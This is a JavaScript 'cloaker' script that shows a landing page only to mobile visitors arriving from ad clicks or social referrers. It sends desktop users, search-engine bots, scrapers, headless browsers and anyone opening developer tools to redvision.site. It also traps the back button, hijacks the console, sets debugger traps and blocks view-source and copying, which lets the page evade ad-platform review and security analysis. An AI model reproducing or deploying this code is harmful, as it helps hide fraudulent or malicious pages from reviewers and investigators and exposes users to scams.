/**
 * Advanced Cloaker System v2.0
 * Protection: Mobile-only, UTM required, DevTools blocked, Anti-clone
 * Redirect: redvision.site
 */
(function() {
    'use strict';
    
    // ============================================
    // CONFIGURATION
    // ============================================
    const CONFIG = {
        redirectUrl: 'https://redvision.site',
        requiredUtmParams: ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'fbclid', 'gclid', 'ref', 'src'],
        allowedReferrers: ['facebook.com', 'fb.com', 'instagram.com', 'google.com', 'tiktok.com', 't.co', 'twitter.com', 'youtube.com'],
        bypassKey: '__clk_bypass__',
        debugMode: false
    };

    // ============================================
    // UTILITY FUNCTIONS
    // ============================================
    const utils = {
        log: function(msg) {
            if (CONFIG.debugMode) console.log('[Cloaker]', msg);
        },
        
        redirect: function(reason) {
            utils.log('Redirecting: ' + reason);
            try {
                // Clear history to prevent back button
                window.history.pushState(null, '', window.location.href);
                window.history.pushState(null, '', window.location.href);
                window.history.pushState(null, '', window.location.href);
                
                // Multiple redirect methods for reliability
                window.location.replace(CONFIG.redirectUrl);
                window.location.href = CONFIG.redirectUrl;
                document.location = CONFIG.redirectUrl;
                
                // Fallback
                setTimeout(function() {
                    window.open(CONFIG.redirectUrl, '_self');
                }, 100);
            } catch(e) {
                window.location = CONFIG.redirectUrl;
            }
        },
        
        getCookie: function(name) {
            const value = '; ' + document.cookie;
            const parts = value.split('; ' + name + '=');
            if (parts.length === 2) return parts.pop().split(';').shift();
            return null;
        },
        
        setCookie: function(name, value, days) {
            const date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            document.cookie = name + '=' + value + '; expires=' + date.toUTCString() + '; path=/; SameSite=Strict';
        }
    };

    // ============================================
    // MOBILE DETECTION
    // ============================================
    const mobileDetector = {
        isMobile: function() {
            // Check touch capability
            const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            
            // Check screen size
            const smallScreen = window.innerWidth <= 1024 && window.innerHeight <= 1366;
            
            // Check user agent
            const mobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS|FxiOS/i.test(navigator.userAgent);
            
            // Check platform
            const mobilePlatform = /Android|iPhone|iPad|iPod/i.test(navigator.platform) || 
                                   (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
            
            // Check orientation API (mobile specific)
            const hasOrientation = typeof window.orientation !== 'undefined' || 
                                   typeof screen.orientation !== 'undefined';
            
            // Detect emulation mode
            const isEmulated = this.detectEmulation();
            
            if (isEmulated) {
                return false; // Block emulated mobile
            }
            
            // Must pass multiple checks
            return (mobileUA || mobilePlatform) && (hasTouch || smallScreen);
        },
        
        detectEmulation: function() {
            // Check for Chrome DevTools mobile emulation
            const widthMismatch = window.outerWidth - window.innerWidth > 160;
            const heightMismatch = window.outerHeight - window.innerHeight > 200;
            
            // Check for unusual pixel ratio
            const suspiciousRatio = window.devicePixelRatio === 1 && 
                                    /Android|iPhone/i.test(navigator.userAgent);
            
            // Check performance timing (emulators often have different patterns)
            const timing = performance.timing || {};
            const loadTime = timing.loadEventEnd - timing.navigationStart;
            const suspiciousTiming = loadTime < 50 && loadTime !== 0;
            
            return widthMismatch || heightMismatch || suspiciousRatio || suspiciousTiming;
        }
    };

    // ============================================
    // UTM VALIDATOR
    // ============================================
    const utmValidator = {
        hasValidUtm: function() {
            const urlParams = new URLSearchParams(window.location.search);
            
            // Check URL params
            for (let param of CONFIG.requiredUtmParams) {
                if (urlParams.has(param) && urlParams.get(param).length > 0) {
                    // Store valid UTM for future page visits
                    this.storeUtm();
                    return true;
                }
            }
            
            // Check stored UTM
            if (this.hasStoredUtm()) {
                return true;
            }
            
            // Check referrer
            if (this.hasValidReferrer()) {
                return true;
            }
            
            return false;
        },
        
        storeUtm: function() {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                const utmData = {};
                
                CONFIG.requiredUtmParams.forEach(function(param) {
                    if (urlParams.has(param)) {
                        utmData[param] = urlParams.get(param);
                    }
                });
                
                if (Object.keys(utmData).length > 0) {
                    localStorage.setItem('_clk_utm', JSON.stringify(utmData));
                    sessionStorage.setItem('_clk_valid', '1');
                    utils.setCookie('_clk_v', '1', 30);
                }
            } catch(e) {}
        },
        
        hasStoredUtm: function() {
            try {
                return localStorage.getItem('_clk_utm') !== null ||
                       sessionStorage.getItem('_clk_valid') === '1' ||
                       utils.getCookie('_clk_v') === '1';
            } catch(e) {
                return false;
            }
        },
        
        hasValidReferrer: function() {
            const referrer = document.referrer.toLowerCase();
            if (!referrer) return false;
            
            for (let allowed of CONFIG.allowedReferrers) {
                if (referrer.includes(allowed)) {
                    return true;
                }
            }
            return false;
        }
    };

    // ============================================
    // DEVTOOLS DETECTION & BLOCKING
    // ============================================
    const devToolsBlocker = {
        isDevToolsOpen: false,
        threshold: 160,
        
        init: function() {
            const self = this;
            
            // Method 1: Size detection
            this.checkSize();
            window.addEventListener('resize', function() { self.checkSize(); });
            
            // Method 2: Console detection
            this.detectConsole();
            
            // Method 3: Debugger detection
            this.detectDebugger();
            
            // Method 4: Block keyboard shortcuts
            this.blockShortcuts();
            
            // Method 5: Block right-click
            this.blockRightClick();
            
            // Method 6: Continuous monitoring
            setInterval(function() { self.monitor(); }, 500);
        },
        
        checkSize: function() {
            const widthThreshold = window.outerWidth - window.innerWidth > this.threshold;
            const heightThreshold = window.outerHeight - window.innerHeight > this.threshold;
            
            if (widthThreshold || heightThreshold) {
                this.isDevToolsOpen = true;
                utils.redirect('DevTools detected (size)');
            }
        },
        
        detectConsole: function() {
            const self = this;
            
            // Override console methods
            const methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace'];
            methods.forEach(function(method) {
                const original = console[method];
                console[method] = function() {
                    self.isDevToolsOpen = true;
                    // Don't redirect on console use, just flag it
                };
            });
            
            // Detect console.log with object
            const element = new Image();
            Object.defineProperty(element, 'id', {
                get: function() {
                    self.isDevToolsOpen = true;
                    utils.redirect('Console inspection detected');
                }
            });
            
            // Trigger detection periodically
            setInterval(function() {
                console.log('%c', element);
                console.clear();
            }, 1000);
        },
        
        detectDebugger: function() {
            const self = this;
            
            // Timing-based detection
            setInterval(function() {
                const start = performance.now();
                debugger;
                const end = performance.now();
                
                if (end - start > 100) {
                    self.isDevToolsOpen = true;
                    utils.redirect('Debugger detected');
                }
            }, 1000);
        },
        
        blockShortcuts: function() {
            document.addEventListener('keydown', function(e) {
                // F12
                if (e.keyCode === 123) {
                    e.preventDefault();
                    utils.redirect('F12 pressed');
                    return false;
                }
                
                // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
                    e.preventDefault();
                    utils.redirect('DevTools shortcut');
                    return false;
                }
                
                // Ctrl+U (View Source)
                if (e.ctrlKey && e.keyCode === 85) {
                    e.preventDefault();
                    utils.redirect('View source');
                    return false;
                }
                
                // Ctrl+S (Save)
                if (e.ctrlKey && e.keyCode === 83) {
                    e.preventDefault();
                    return false;
                }
                
                // Ctrl+Shift+K (Firefox DevTools)
                if (e.ctrlKey && e.shiftKey && e.keyCode === 75) {
                    e.preventDefault();
                    utils.redirect('Firefox DevTools');
                    return false;
                }
            }, true);
        },
        
        blockRightClick: function() {
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });
        },
        
        monitor: function() {
            // Additional runtime checks
            if (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) {
                utils.redirect('Firebug detected');
            }
            
            // Check for devtools extensions
            if (typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined' ||
                typeof window.__VUE_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined') {
                // Common dev tools - just monitor, don't block immediately
            }
        }
    };

    // ============================================
    // ANTI-CLONE PROTECTION
    // ============================================
    const antiClone = {
        init: function() {
            // Prevent iframe embedding
            this.preventIframe();
            
            // Prevent HTTrack and similar tools
            this.detectCrawlers();
            
            // Obfuscate page content
            this.protectContent();
            
            // Detect automation tools
            this.detectAutomation();
            
            // Monitor DOM changes
            this.monitorDOM();
        },
        
        preventIframe: function() {
            if (window.self !== window.top) {
                utils.redirect('Iframe embedding detected');
            }
            
            // X-Frame-Options equivalent
            try {
                if (window.frameElement !== null) {
                    utils.redirect('Frame detected');
                }
            } catch(e) {}
        },
        
        detectCrawlers: function() {
            const crawlerPatterns = [
                /HTTrack/i,
                /wget/i,
                /curl/i,
                /python-requests/i,
                /scrapy/i,
                /PhantomJS/i,
                /HeadlessChrome/i,
                /Selenium/i,
                /WebDriver/i,
                /Puppeteer/i,
                /Playwright/i,
                /CasperJS/i,
                /Nightmare/i,
                /SlimerJS/i,
                /bot/i,
                /spider/i,
                /crawler/i,
                /scraper/i
            ];
            
            const ua = navigator.userAgent;
            
            for (let pattern of crawlerPatterns) {
                if (pattern.test(ua)) {
                    utils.redirect('Crawler detected');
                    return;
                }
            }
            
            // Check for webdriver
            if (navigator.webdriver === true) {
                utils.redirect('WebDriver detected');
            }
            
            // Check for automation flags
            if (window._phantom || window.__nightmare || window.callPhantom) {
                utils.redirect('Automation tool detected');
            }
        },
        
        protectContent: function() {
            // Disable text selection
            document.addEventListener('selectstart', function(e) {
                e.preventDefault();
            });
            
            // Disable drag
            document.addEventListener('dragstart', function(e) {
                e.preventDefault();
            });
            
            // Disable copy
            document.addEventListener('copy', function(e) {
                e.preventDefault();
            });
            
            // Add CSS protection
            const style = document.createElement('style');
            style.textContent = `
                * {
                    -webkit-user-select: none !important;
                    -moz-user-select: none !important;
                    -ms-user-select: none !important;
                    user-select: none !important;
                }
                input, textarea {
                    -webkit-user-select: text !important;
                    -moz-user-select: text !important;
                    -ms-user-select: text !important;
                    user-select: text !important;
                }
            `;
            document.head.appendChild(style);
        },
        
        detectAutomation: function() {
            // Check for missing APIs that real browsers have
            const checks = [
                typeof navigator.languages !== 'undefined',
                typeof navigator.plugins !== 'undefined',
                navigator.plugins.length > 0 || /Mobile/i.test(navigator.userAgent),
                typeof window.chrome !== 'undefined' || !/Chrome/i.test(navigator.userAgent)
            ];
            
            // Suspicious if too many checks fail
            let failed = 0;
            checks.forEach(function(check) {
                if (!check) failed++;
            });
            
            if (failed >= 3) {
                utils.redirect('Automation environment detected');
            }
        },
        
        monitorDOM: function() {
            // Detect if someone is inspecting elements
            const observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    // Check for suspicious attribute additions
                    if (mutation.type === 'attributes') {
                        const attr = mutation.attributeName;
                        if (attr && (attr.includes('data-reactroot') || attr.includes('__'))) {
                            // React/Vue devtools - just monitor
                        }
                    }
                });
            });
            
            observer.observe(document.body, {
                attributes: true,
                childList: true,
                subtree: true
            });
        }
    };

    // ============================================
    // BOT DETECTION
    // ============================================
    const botDetector = {
        check: function() {
            // Check for headless browser indicators
            if (this.isHeadless()) {
                utils.redirect('Headless browser detected');
                return false;
            }
            
            // Check for common bot indicators
            if (this.isBot()) {
                utils.redirect('Bot detected');
                return false;
            }
            
            return true;
        },
        
        isHeadless: function() {
            // Chrome headless detection
            if (/HeadlessChrome/.test(navigator.userAgent)) {
                return true;
            }
            
            // Check for missing features
            if (!window.chrome && /Chrome/.test(navigator.userAgent)) {
                return true;
            }
            
            // Check permissions API
            if (navigator.permissions) {
                try {
                    navigator.permissions.query({ name: 'notifications' }).then(function(result) {
                        if (Notification.permission === 'denied' && result.state === 'prompt') {
                            // Inconsistency detected
                        }
                    });
                } catch(e) {}
            }
            
            // Check for missing plugins in Chrome
            if (/Chrome/.test(navigator.userAgent) && navigator.plugins.length === 0 && !mobileDetector.isMobile()) {
                return true;
            }
            
            return false;
        },
        
        isBot: function() {
            const botPatterns = [
                /googlebot/i,
                /bingbot/i,
                /slurp/i,
                /duckduckbot/i,
                /baiduspider/i,
                /yandexbot/i,
                /facebot/i,
                /ia_archiver/i,
                /semrushbot/i,
                /ahrefsbot/i,
                /mj12bot/i,
                /dotbot/i
            ];
            
            const ua = navigator.userAgent.toLowerCase();
            
            for (let pattern of botPatterns) {
                if (pattern.test(ua)) {
                    return true;
                }
            }
            
            return false;
        }
    };

    // ============================================
    // MAIN INITIALIZATION
    // ============================================
    function init() {
        try {
            // Check for bypass (for testing)
            if (utils.getCookie(CONFIG.bypassKey) === 'true') {
                utils.log('Bypass active');
                return;
            }
            
            // 1. Bot detection (allow some bots for SEO but block scrapers)
            if (!botDetector.check()) {
                return;
            }
            
            // 2. Mobile check
            if (!mobileDetector.isMobile()) {
                utils.redirect('Desktop access blocked');
                return;
            }
            
            // 3. UTM validation
            if (!utmValidator.hasValidUtm()) {
                utils.redirect('No valid UTM parameters');
                return;
            }
            
            // 4. Initialize protections (after validation passed)
            devToolsBlocker.init();
            antiClone.init();
            
            utils.log('All checks passed');
            
        } catch(e) {
            utils.log('Error: ' + e.message);
            // On error, still protect
            utils.redirect('Security error');
        }
    }
    
    // Run immediately
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // Also run on load for extra security
    window.addEventListener('load', function() {
        // Re-check after full load
        if (!mobileDetector.isMobile() && !utils.getCookie(CONFIG.bypassKey)) {
            utils.redirect('Post-load desktop check');
        }
    });
    
})();
